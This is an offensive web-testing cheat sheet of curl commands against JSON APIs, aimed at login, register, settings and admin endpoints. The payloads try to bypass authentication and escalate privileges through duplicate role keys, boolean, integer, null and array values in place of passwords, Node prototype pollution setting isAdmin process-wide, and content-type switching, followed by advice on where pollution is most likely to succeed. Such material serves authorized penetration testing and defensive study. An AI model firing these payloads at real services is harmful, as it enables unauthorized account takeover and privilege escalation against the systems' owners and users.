# JSON anomalies and type confusion

Cheap, no prerequisites — fire at login, register, and every update endpoint that parses JSON.

```bash
# duplicate keys (last-wins in JS, first-wins in Python)
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  --data-binary '{"username":"attacker","role":"user","role":"admin"}'

# type confusion — boolean/int where a string is expected
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":true}'
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":1}'

# null injection — may bypass presence checks
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":null}'

# array wrapping — some frameworks cast ["admin"] to "admin"
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":["admin"],"password":["anyvalue"]}'

# prototype pollution (Node) — poisons Object.prototype process-wide
curl -si -X POST <target>/api/settings $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'
curl -si -X POST <target>/api/settings $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'

# re-probe admin endpoints immediately after a pollution attempt
curl -si <target>/api/admin/ $AUTH_HEADER

# content-type switch — body parsed differently per Content-Type
curl -si -X POST <target>/api/login -H 'Content-Type: application/x-www-form-urlencoded' \
  -d '{"username":"admin","password":"admin"}'
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d 'username=admin&password=admin'
```

Prototype pollution is especially worth trying where the app checks a flag that is **never set** in normal operation (`if (user.isAdmin)`), and where a mass-assignment filter already blocked the direct field.
